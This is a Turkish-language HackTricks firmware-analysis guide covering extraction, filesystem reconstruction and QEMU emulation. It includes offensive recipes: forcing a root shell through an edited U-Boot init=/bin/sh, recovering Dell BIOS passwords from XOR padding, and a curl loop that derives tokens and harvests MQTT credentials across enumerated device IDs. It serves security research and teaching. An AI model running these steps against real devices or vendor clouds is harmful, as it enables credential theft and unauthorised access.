# Firmware Analizi

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Giriş**

### İlgili kaynaklar

Açıkta bulunan donanım arayüzlerinden veri edinmek için [UART konsolu yardımıyla firmware dökümü alma](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) ve [SPI flash dökümü alma](../hardware-hacking/spi.md#dumping-firmware-from-eeproms) bölümlerine bakın.

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware, donanım bileşenleri ile kullanıcıların etkileşimde bulunduğu yazılım arasındaki iletişimi yönetip kolaylaştırarak cihazların düzgün çalışmasını sağlayan temel yazılımdır. Kalıcı bellekte saklanır ve cihazın açıldığı andan itibaren önemli talimatlara erişebilmesini sağlar; böylece işletim sistemi başlatılır. Güvenlik açıklarını belirlemede firmware'i incelemek ve olası değişiklikler yapmak kritik bir adımdır.<sup>[[2]](#references)[[3]](#references)</sup>

## **Bilgi Toplama**

**Bilgi toplama**, bir cihazın yapısını ve kullandığı teknolojileri anlamada kritik bir ilk adımdır. Bu süreç şu konularda veri toplamayı içerir:

- CPU mimarisi ve üzerinde çalıştığı işletim sistemi
- Bootloader ayrıntıları
- Donanım düzeni ve veri sayfaları
- Kod tabanı ölçümleri ve kaynak konumları
- Harici kütüphaneler ve lisans türleri
- Güncelleme geçmişi ve mevzuat sertifikaları
- Mimari ve akış diyagramları
- Güvenlik değerlendirmeleri ve belirlenen güvenlik açıkları

Bu amaçla **open-source intelligence (OSINT)** araçları oldukça değerlidir. Mevcut açık kaynaklı yazılım bileşenlerini manuel ve otomatik inceleme süreçleriyle analiz etmek de aynı şekilde faydalıdır. [Coverity Scan](https://scan.coverity.com) ve [Semmle’s LGTM](https://lgtm.com/#explore) gibi araçlar, olası sorunları bulmak için kullanılabilecek ücretsiz statik analiz olanağı sunar.

## **Firmware'i Edinme**

Firmware çeşitli yöntemlerle edinilebilir; her yöntemin karmaşıklık düzeyi farklıdır:

- Kaynağından **doğrudan** (geliştiricilerden, üreticilerden)
- Sağlanan talimatları izleyerek **derleyerek**
- Resmî destek sitelerinden **indirerek**
- Barındırılan firmware dosyalarını bulmak için **Google dork** sorguları kullanarak
- [S3Scanner](https://github.com/sa7mon/S3Scanner) gibi araçlarla **cloud storage**'a doğrudan erişerek
- Man-in-the-middle teknikleriyle **güncellemeleri** yakalayarak
- **UART**, **JTAG** veya **PICit** gibi bağlantılar üzerinden cihazdan **çıkararak**
- Cihaz iletişimindeki güncelleme isteklerini **dinleyerek**
- **Sabit kodlanmış güncelleme uç noktalarını** belirleyip kullanarak
- Bootloader'dan veya ağ üzerinden **döküm alarak**
- Diğer yöntemler başarısız olduğunda, uygun donanım araçlarıyla depolama yongasını **çıkarıp okuyarak**

### Yalnızca UART günlükleri: flash'taki U-Boot ortam değişkenleriyle root shell'i zorla başlatma

UART RX yoksayılıyorsa (yalnızca günlükler alınıyorsa), U-Boot ortam değişkeni blob'unu çevrimdışı **düzenleyerek** yine de bir init shell'i zorla başlatabilirsiniz:<sup>[[6]](#references)</sup>

1. SOIC-8 klipsi ve programlayıcıyla (3.3V) SPI flash dökümünü alın:
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. U-Boot env partition'ını bulun, `bootargs` değerini `init=/bin/sh` içerecek şekilde düzenleyin ve **blob için U-Boot env CRC32 değerini yeniden hesaplayın**.
3. Yalnızca env partition'ını yeniden flash'leyip cihazı yeniden başlatın; UART üzerinde bir shell görünmelidir.

Bu yöntem, bootloader shell'i devre dışı bırakılmış ancak env partition'ına harici flash erişimiyle yazılabilen gömülü cihazlarda kullanışlıdır.

## Firmware'i analiz etme

Artık **firmware'e sahip olduğunuza göre**, nasıl işlem yapmanız gerektiğini bilmek için firmware'den bilgi çıkarmanız gerekir. Bunun için kullanabileceğiniz farklı araçlar:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Bu araçlarla fazla bir şey bulamazsanız, `binwalk -E <bin>` ile görüntünün **entropisini** kontrol edin; entropi düşükse şifrelenmiş olma ihtimali düşüktür. Entropi yüksekse muhtemelen şifrelenmiştir (veya bir şekilde sıkıştırılmıştır).

Ayrıca, **firmware içine gömülü dosyaları** çıkarmak için şu araçları kullanabilirsiniz:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ya da dosyayı incelemek için [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) kullanabilirsiniz.

### Diferansiyel flash analizi ve kurtarılabilir XOR gizli veri depoları

Bir firmware ayarının belgelenmiş bir depolama biçimi yoksa, önce eşleşen birkaç flash okuması alın, **tam olarak bir** ayarı değiştirin, çipin tamamını yeniden dump edin ve ofsetleri karşılaştırın. Deneyi kontrollü değerlerle tekrarlamak, ayarı sayaçlardan ve yazma meta verilerinden ayırt etmeyi sağlar; verilerin yerinde değiştirilmek yerine yeni ofsetlerde değişmesi, yalnızca sona eklemeli veya log yapılı bir depoya işaret eder. Silinmiş/tombstone kayıtlarını da saklayın; yük verileri hâlâ kurtarılabilir olabilir.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Bölgeyi bulduktan sonra firmware modüllerini `binwalk` gibi araçlarla çıkarın ve writer/validator'ı Ghidra'da tersine mühendislikle inceleyin. Şemayı yalnızca şifreli metindeki örüntülerden çıkarsamak yerine, alan sınırlarını, padding'i, anahtar indekslemesini ve anahtar türetimini kodda doğrulayın.<sup>[[12]](#references)</sup>

#### Şifrelenmiş sıfır padding'den anahtar kurtarma

[XOR-based encryption](../../crypto/symmetric/#xor-based-encryption) bölümünde açıklandığı gibi, bilinen açık metin aynı offset'lerdeki keystream baytlarını ortaya çıkarır. Tekrarlanan bir XOR anahtarının tüm indekslerini sıfır padding'iyle kapladığında, sabit boyutlu bir alan özellikle savunmasızdır: `0x00 XOR key_byte = key_byte` olduğundan, şifrelenmiş padding bu anahtar baytlarını doğrudan açığa çıkarır. Her anahtar indeksi kapsanıyorsa, anahtarı şifreli metnin sonundan yeniden oluşturun ve doldurulmuş baytların şifresini çözün.<sup>[[12]](#references)</sup>

Dell'in güvenlik açığı içeren DVAR BIOS-parolası biçimi somut bir örnektir: 32 baytlık alanın `0` numaralı baytı açık metinken, `1..31` numaralı baytlar tekrarlanan 20 baytlık bir anahtar kullanır.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Parola uzunluğu `L` olduğunda, XOR işleminden önce `L..31` konumları sıfırdı. `L <= 12` olduğunda bu konumlar tüm anahtar indekslerini kapsar; böylece tam anahtar ve parola brute force yapmadan kurtarılır:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Tarihsel kayıtlardan anahtarları çıkarma

Her kaydı bağımsız olarak analiz etmeyin. DVAR anahtarı yaklaşık olarak `modified_md5(device_seed || variable_GUID || password[0])` şeklinde türetilir: device seed ve GUID sabittir; parolaya bağlı tek girdi, açık metin hâlindeki ilk bayttır. Bu, cihaz başına en fazla 256 anahtar olabileceği ve aynı baytla başlayan kayıtların aynı anahtarı paylaşacağı anlamına gelir. Etkin ve silinmiş kayıtları bu bayta göre gruplayın; kısa bir geçmiş kayıt, padding yoluyla tam anahtarı leak edebilir ve kendi padding’i yetersiz olan güncel, daha uzun bir kaydın şifresini çözebilir. Bu nedenle parola rotasyonu, eski ciphertext silinmek yerine tombstone olarak işaretlendiğinde maruziyeti artırabilir.<sup>[[12]](#references)</sup>

[`dellpwn`](https://github.com/R3n5k1/dellpwn) aracı DVAR'ı bulur, aday kayıtları doğrular, parolaları kurtarır ve depolanan ham verileri/anahtar baytlarını görüntüleyebilir. Aracı bir checkout üzerinden derleyin ve doğrulanmış bir flash image'ını aşağıdaki gibi tarayın:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Özel parser'larda, kayıt yapısı, yazdırılabilir karakter kısıtları, sıfır dolgusu kontrolleri, key entropy ve key'in döngüye girdiği noktadaki tutarlılığı kullanarak false positive'leri reddedin. Tekrarlanan dump'larda seyrek, yazma başına bit değişiklikleri görülüyorsa gözlemlenen maskeleri listeleyin ve bu kısıtları kullanarak düzeltmeleri sıralayın; ancak sezgisel çıktıyı kesin kurtarma sonucu gibi sunmak yerine belirsiz karakterleri belirtin.<sup>[[12]](#references)</sup>

Password verifier'lar, geri döndürülebilir ciphertext yerine salt eklenmiş, iterasyonlu bir one-way hash saklamalıdır; log-structured depolar ise kullanımdan kaldırılmış gizli materyali güvenli şekilde silmelidir.<sup>[[12]](#references)</sup>

### Dosya Sistemini Alma

Önceki yorum satırındaki araçlarla, örneğin `binwalk -ev <bin>`, **dosya sistemini çıkarmış** olmanız gerekirdi.\
Binwalk genellikle dosya sistemini, dosya sistemi türünün adıyla anılan bir **klasörün** içine çıkarır. Bu tür genellikle şunlardan biridir: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Dosya Sistemini Elle Çıkarma

Bazen binwalk, imza listesinde dosya sistemine ait **magic byte'ı bulundurmaz**. Bu durumlarda, dosya sisteminin offset'ini bulmak ve sıkıştırılmış dosya sistemini binary'den carve etmek için binwalk kullanın; ardından aşağıdaki adımları izleyerek dosya sistemini türüne göre **elle çıkarın**.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Squashfs dosya sistemini carve etmek için aşağıdaki **dd command**'i çalıştırın.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternatif olarak aşağıdaki komut da çalıştırılabilir.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs için (yukarıdaki örnekte kullanılmıştır)

`$ unsquashfs dir.squashfs`

Dosyalar daha sonra "`squashfs-root`" dizininde bulunur.

- CPIO arşiv dosyaları

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 dosya sistemleri için

`$ jefferson rootfsfile.jffs2`

- NAND flash kullanan ubifs dosya sistemleri için

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Bölünmüş gömülü root dosya sistemlerini yeniden oluşturma

Ham bir eMMC/SSD dökümü geçerli bir dosya sistemi başlığı içeriyor, ancak meta veri ofsetleri nominal bölümün ötesine uzanıyorsa, onu hemen bozuk olarak sınıflandırmayın. Gömülü önyükleme kodu, Device Mapper ile birden fazla fiziksel aralıktan gerçek root aygıtını bir araya getirebilir; bu nedenle tek bir GPT bölümünden veri ayıklamak yalnızca ilk segmenti verir.<sup>[[9]](#references)</sup>

#### Tüm medya imajını ilk değerlendirmeden geçirin

Önce edinimin tamamlandığını, boyutun sabit kaldığını ve imajı hâlâ hiçbir yazma işleminin kullanmadığını doğrulayın. Dosya adı başlangıç/bitiş adresi içeriyorsa bu aralığı gerçek bayt sayısıyla karşılaştırın. GPT’yi salt okunur modda kurtarın ve yalnızca gerekli aralığı bağlayın; iş istasyonunda güvenilmeyen bir fiziksel birimde `vgchange -ay` komutunu çalıştırmayın; çünkü birim grubu çakışmaları ve istenmeyen yazma işlemleri meydana gelebilir.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Orijinal init mantığının veya bir LVM yığınının tüm imajı görmesi gerekiyorsa, atılabilir bir VM tercih edin. Standart bir boot bölümündeki geçmiş boot günlükleri özellikle yararlıdır: bootloader özel kapsayıcı ofsetlerini, bileşen uzunluklarını, slot seçimini, hizalama kurallarını ve imza doğrulamasını kaydetmiş olabilir. Gömülü bir komut satırını/kernel/initramfs'i ayıklamak için bu değerleri kullanın, ardından her çıktıyı `file`, magic bytes ve `binwalk` ile ayrı ayrı doğrulayın; kapsayıcının sonuna kadar okumak, kernel'e yanlışlıkla bir initrd, ACPI nesnesi veya imza eklenmesine neden olabilir.<sup>[[9]](#references)</sup>

#### Boot sırasında kullanılan blok eşlemesini kurtarın

Kernel'in initramfs'ini çıkarın ve `/init` ile depolama kitaplıklarını tersine mühendislikle inceleyin. [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) bölümünde `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` ve bölüm yollarına yapılan string başvurularını izleyin; ardından etkin A/B slotunu seçen ve tabloyu oluşturan kodun izini sürün. radare2 için yararlı başlangıç noktaları `r2 -A init`, `afl`, `pdf @ main` ve `pdf @ fcn.xxxxx` komutlarıdır.<sup>[[9]](#references)</sup>

linear hedefi, sanal bir aygıtın ardışık aralıklarını bir veya daha fazla arka uç aygıtının aralıklarına eşler. Kurtarılan iki segmentli bir tablo genellikle şu biçimdedir (tüm konumlar ve uzunluklar 512 baytlık sektörler cinsindendir):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Makine kodu aritmetiğini; tamsayı genişliği, kaydırmalar ve birim dönüşümleri dâhil, aynen uygulayın. Örneğin aşağıdaki ifade, bayt cinsinden boyutu önce 4-KiB sınırına yuvarlar ve ancak ardından 512 baytlık sektörlere dönüştürür; bunu `p4_bytes // 512` ile değiştirmek, bölüm sayfa hizalı olmadığında seçilen kuyruğu `p4_bytes % 4096` kadar kaydırır.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Tablodaki aralıkları sırayla ve sınırlandırılmış parçalar hâlinde kopyalayarak, medya dökümünün tamamını belleğe yüklemeden düz bir analiz imajı oluşturun. Bu, host tarafında mapper aygıtları oluşturulmasını da önler. GPT'den türetilen offset'leri, ters çevrilmiş sektör sayılarını ve elde edilen çıktı uzunluğunu ayrı assertion'lar olarak tutun.<sup>[[9]](#references)</sup>

#### Bozulmayı sabit bir yeniden oluşturma hatasından ayırt edin

SquashFS için `unsquashfs` çalıştırmadan önce `hsqs` magic değerini kontrol edin ve superblock offset 40'taki little-endian 64-bit `bytes_used` alanını çözümleyin. Birbirinden bağımsız birkaç yapıda çıkarma işlemi başarısız olursa, beklenen konumların çevresinde geniş bir arama aralığı tarayın ve güçlü yapısal adaylar arayın: decompress edilebilen bir metadata bloğu, art arda gelen birkaç geçerli dizin girdisi, makul inode alanları, inode sayısıyla tutarlı bir root inode veya geçerli bir integrity-metadata yapısı. Tek bir magic eşleşmesi yeterli değildir.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Aynı imzalı delta bağımsız yapıları (örneğin dizin metadata'sını ve bir verity kaydını) geçerli kılıyorsa, olası neden eksik baytlar değil, sistematik bir segment başlangıcı hatasıdır. Orphan recovery veya dosya sistemi metadata'sını patchlemeye çalışmadan önce tersine çevrilmiş aritmetiğe dönün ve atılan kalanları, signedness'ı, taşmayı veya sektör/sayfa yuvarlamasını inceleyin.<sup>[[9]](#references)</sup>

Son olarak, koruma sınırlarını birbirinden ayrı tutun: TPM-sealed LUKS volume'lar veri gizliliğini korurken, imzalı dm-verity mapping root dosya sistemi bütünlüğünü korur. Bir software TPM, orijinal fiziksel TPM'ye mühürlenmiş bir anahtarı kurtaramaz; verity doğrulamasını atlayan, yalnızca araştırma amaçlı bir init ile değiştirilmiş bir SquashFS'yi boot etmek de imzasını taklit etmez veya dm-verity'yi bozmaz.<sup>[[9]](#references)</sup>

## Firmware Analizi

Firmware elde edildikten sonra yapısını ve olası güvenlik açıklarını anlamak için onu incelemek önemlidir. Bu süreç, firmware imajını analiz etmek ve içinden değerli verileri çıkarmak için çeşitli araçlardan yararlanmayı içerir.

### İlk Analiz Araçları

İkili dosyayı (`<bin>` olarak anılacaktır) ilk incelemek için bir dizi komut sunulmuştur. Bu komutlar dosya türlerini belirlemeye, string'leri çıkarmaya, ikili verileri analiz etmeye ve bölüm ile dosya sistemi ayrıntılarını anlamaya yardımcı olur:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Görüntünün şifreleme durumunu değerlendirmek için `binwalk -E <bin>` komutuyla **entropi** kontrol edilir. Düşük entropi, şifreleme olmadığını düşündürürken yüksek entropi olası şifreleme veya sıkıştırmaya işaret eder.

**Gömülü dosyaları** çıkarmak için **file-data-carving-recovery-tools** dokümantasyonu ve dosyaları incelemek için **binvis.io** gibi araçlar ve kaynaklar önerilir.

### Dosya Sistemini Çıkarma

`binwalk -ev <bin>` komutuyla dosya sistemi genellikle çıkarılabilir; çoğu zaman dosya sistemi türünün adını taşıyan bir dizine (ör. squashfs, ubifs) çıkarılır. Ancak **binwalk**, magic byte'ların eksik olması nedeniyle dosya sistemi türünü tanıyamazsa manuel çıkarma gerekir. Bunun için `binwalk` ile dosya sisteminin offset'i bulunur ve ardından `dd` komutuyla dosya sistemi ayrıştırılır:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Daha sonra, dosya sistemi türüne (ör. squashfs, cpio, jffs2, ubifs) bağlı olarak içerikleri elle çıkarmak için farklı komutlar kullanılır.

### Dosya Sistemi Analizi

Dosya sistemi çıkarıldıktan sonra güvenlik açıkları aranmaya başlanır. Güvenli olmayan ağ daemon'ları, koda gömülü kimlik bilgileri, API uç noktaları, güncelleme sunucusu işlevleri, derlenmemiş kodlar, başlangıç betikleri ve çevrimdışı analiz için derlenmiş ikili dosyalar incelenir.

İncelenmesi gereken **önemli konumlar** ve **öğeler** şunlardır:

- Kullanıcı kimlik bilgileri için **etc/shadow** ve **etc/passwd**
- **etc/ssl** içindeki SSL sertifikaları ve anahtarları
- Olası güvenlik açıkları için yapılandırma ve betik dosyaları
- Daha ayrıntılı analiz için gömülü ikili dosyalar
- Yaygın IoT cihazı web sunucuları ve ikili dosyaları

Dosya sistemi içindeki hassas bilgileri ve güvenlik açıklarını ortaya çıkarmaya çeşitli araçlar yardımcı olur:

- Hassas bilgi araması için [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) ve [**Firmwalker**](https://github.com/craigz28/firmwalker)
- Kapsamlı firmware analizi için [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- Statik ve dinamik analiz için [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) ve [**EMBA**](https://github.com/e-m-b-a/emba)

### Derlenmiş İkili Dosyalarda Güvenlik Kontrolleri

Dosya sisteminde bulunan hem kaynak kodu hem de derlenmiş ikili dosyalar güvenlik açıkları açısından incelenmelidir. Unix ikili dosyaları için **checksec.sh**, Windows ikili dosyaları için **PESecurity** gibi araçlar, istismar edilebilecek korumasız ikili dosyaları belirlemeye yardımcı olur.

## Türetilmiş URL belirteçleriyle cloud yapılandırmasını ve MQTT kimlik bilgilerini elde etme

Birçok IoT hub'ı, cihaza özel yapılandırmasını şu biçimdeki bir cloud uç noktasından alır:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Firmware analizi sırasında `<token>` değerinin, örneğin koda gömülü bir sır kullanılarak cihaz kimliğinden yerel olarak türetildiğini görebilirsiniz:

- token = MD5( deviceId || STATIC_KEY ) ve büyük harfli hex olarak gösterilir

Bu tasarım, deviceId değerini ve STATIC_KEY'i öğrenen herkesin URL'yi yeniden oluşturup cloud yapılandırmasını almasına olanak tanır; bu yapılandırma çoğu zaman düz metin MQTT kimlik bilgilerini ve topic öneklerini açığa çıkarır.

Uygulamalı iş akışı:

1) deviceId değerini UART açılış günlüklerinden çıkarın

- 3.3V UART adaptörünü (TX/RX/GND) bağlayıp günlükleri kaydedin:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Örneğin, cloud config URL pattern'ini ve broker adresini yazdıran satırları arayın:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Firmware’den STATIC_KEY ve token algoritmasını kurtarın

- Binary dosyaları Ghidra/radare2’ye yükleyin ve config path ("/pf/") veya MD5 kullanımını arayın.
- Algoritmayı doğrulayın (ör. MD5(deviceId||STATIC_KEY)).
- Token’ı Bash’te türetin ve digest’i büyük harfe çevirin:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Bulut yapılandırmasını ve MQTT kimlik bilgilerini toplayın

- URL'yi oluşturup curl ile JSON'u çekin; sırları çıkarmak için jq ile ayrıştırın:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Açık metin MQTT'yi ve zayıf topic ACL'lerini kötüye kullanın (varsa)

- Kurtarılan kimlik bilgilerini kullanarak bakım topic'lerine abone olun ve hassas olayları arayın:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Tahmin edilebilir cihaz ID'lerini numaralandırın (ölçekli ve yetkilendirmeyle)

- Birçok ekosistem, satıcı OUI/ürün/tür baytlarının ardından sıralı bir sonek içerir.
- Aday ID'ler üzerinde yineleme yapabilir, token'lar türetebilir ve yapılandırmaları programatik olarak alabilirsiniz:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Notlar
- Toplu enumeration işlemine başlamadan önce daima açık yetki alın.
- Mümkün olduğunda, hedef donanımı değiştirmeden sırları kurtarmak için emülasyonu veya statik analizi tercih edin.


Firmware'i emüle etme süreci, bir cihazın çalışmasının veya tek bir programın **dinamik analizini** mümkün kılar. Bu yaklaşım, donanım veya mimari bağımlılıkları nedeniyle zorluklarla karşılaşabilir; ancak root filesystem'ı veya belirli binary'leri Raspberry Pi gibi mimarisi ve endian düzeni eşleşen bir cihaza ya da önceden oluşturulmuş bir sanal makineye aktarmak, daha ileri testleri kolaylaştırabilir.

### Tekil Binary'leri Emüle Etme

Tek programları incelerken, programın endian düzenini ve CPU mimarisini belirlemek çok önemlidir.

#### MIPS Mimarisi Örneği

MIPS mimarisindeki bir binary'yi emüle etmek için şu komut kullanılabilir:

```bash
file ./squashfs-root/bin/busybox
```

Gerekli emülasyon araçlarını yüklemek için:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

For MIPS (big-endian) için `qemu-mips` kullanılır; little-endian binary'ler içinse `qemu-mipsel` tercih edilir.

#### ARM Architecture Emulation

ARM binary'leri için süreç benzerdir; emülasyonda `qemu-arm` emulator'ı kullanılır.

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) gibi araçlar ve diğerleri, tam firmware emülasyonunu kolaylaştırır; süreci otomatikleştirir ve dinamik analize yardımcı olur.

### Emülasyon için bölünmüş ve doğrulanmış root filesystem'leri yeniden oluşturma

SquashFS superblock okunabiliyor ancak inode, dizin veya fragment-table offset'leri imkânsız görünüyorsa, hemen `unsquashfs`'i yamalamayın. İlk açılış binary'sini tersine mühendislikle analiz edip oluşturduğu block-device grafiğini yeniden üretin: gömülü sistemler nominal bir root partition sunabilir, ancak gerçek filesystem'i başka bir partition'dan alınan sektörleri ekleyen bir `dm-linear` mapping ile oluşturabilir. Superblock denetimleri başarılı olabilir; buna rağmen sonraki tüm metadata bloklarının yeri kaymış olabilir.<sup>[[11]](#references)</sup>

Firmware'in aritmetiğini aynen koruyun. Özellikle uzunlukların byte, 512-byte sektör veya 4 KiB sayfa cinsinden olup olmadığını belirleyin; shift ve truncation işlemlerini özgün sıralarında uygulayın ve A/B düzenlerindeki bankaya bağlı tail region'ları hesaba katın. Örneğin, `(partition_bytes >> 12) << 3` önce 4 KiB sınırına göre truncation uygular, ardından sonucu 512-byte sektör cinsinden ifade eder; bunu `partition_bytes // 512` ile değiştirmek, eklenen extent'i birkaç kilobyte kaydırabilir ve sonraki tüm SquashFS tablolarını bozabilir.<sup>[[11]](#references)</sup>

Yararlı bir doğrulama iş akışı:<sup>[[11]](#references)</sup>

1. Verifier/init binary'sinden her `dm-linear` segmentinin kaynak cihazını, başlangıç sektörünü ve uzunluğunu çıkarın.
2. Extent'leri hizalama semantiğini değiştirmeden birleştirin veya map edin.
3. Çıkarma hâlâ başarısız olursa, yalnızca tahmin edilen sınırın yakınındaki küçük bir aralıkta arama yapın ve tek başına makul görünen bir superblock'ü kabul etmek yerine art arda gelen birkaç geçerli metadata yapısı arayın.
4. Yeniden oluşturulan image üzerinde değiştirilmemiş `unsquashfs` çalıştırın; tüm dizinlerin ve fragment'lerin başarıyla taranması, `unsquashfs -stat` çıktısından daha güçlü bir kanıttır.

#### Analyst-controlled dm-verity replacement

Analyst, QEMU kernel'ini, initramfs'i ve sanal diskleri kontrol ediyorsa, vendor'ın verification PID 1'i küçük, statically linked bir init ile değiştirerek değiştirilmiş bir root boot edilebilir. Bu, **lab boot-chain substitution** işlemidir; dm-verity'nin, RSA signature'ının, Secure Boot'un veya TPM-sealed key'in kırılması değildir.<sup>[[11]](#references)</sup>

Değiştirilen init, özgün boot path'in işlevsel adımlarını taklit etmelidir: `devtmpfs` mount etmek, `setsid()` çağırmak, `/dev/console`'ı file descriptor 0–2'ye bağlamak, `/proc` ve `/sys` mount etmek, sağlanan block device'ın hazır olmasını beklemek, düzenlenmiş root'u read-only mount etmek, eski root'a ait pseudo-filesystem'leri ayırmak, yeni mount'u `/` üzerine taşımak, `chroot` yapmak ve firmware'in özgün `/sbin/init` dosyasını `execve()` ile çalıştırmak. `MS_MOVE` **öncesinde** `/dev`, `/proc` ve `/sys`'i ayırmak, yeni root'a ait mount point'lerin yanlışlıkla ayrılmasını önler.<sup>[[11]](#references)</sup>

Değiştirilebilir cihaz durumunu değiştirilmiş immutable root'tan ayrı tutun. Bir qcow2 overlay özgün diskin LVM durumunu korurken ikinci bir read-only virtio disk düzenlenmiş SquashFS'i sağlayabilir:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Offline image-state debugging

Yavaş açılışlar, yıkıcı başlangıç betikleri veya güvenilmez konsol günlükleri hatanın kaynağını belirsizleştirdiğinde, kalıcı durumu guest dışında inceleyin. Çalışan bir VM'nin kullandığı overlay'i asla bağlamayın; `qemu-nbd` ile erişime açın, LVM keşfini hedeflenen NBD partition'ıyla sınırlandırın ve bağlantıyı kesmeden önce volume group'u devre dışı bırakın.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
